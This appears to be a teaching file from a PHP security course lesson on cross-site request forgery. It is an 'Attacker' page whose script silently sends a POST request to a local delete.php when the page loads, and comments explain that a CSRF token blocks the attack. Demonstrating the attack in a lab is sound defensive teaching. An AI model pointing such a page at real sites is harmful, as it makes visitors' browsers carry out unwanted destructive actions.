<?php
/*
 * user is redirected to this page via a link that he trusts;
 * but this page will redirect to delete.php;
 * 
 * with the token implemented, coming to this page directly will
 * not redirect to delete.php
 */
?>

<!DOCTYPE html>
<html>
    <head>
        <title>Attacker</title>
    </head>
    <body>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js">
        </script>
        <script>
            $.ajax({
                'url': 'http://localhost/_projetos/PHP_security/codecourse/codecourse-10-lessons/7-CSRF/delete.php',
                'type': 'post'
            });
        </script> 
    </body>
</html>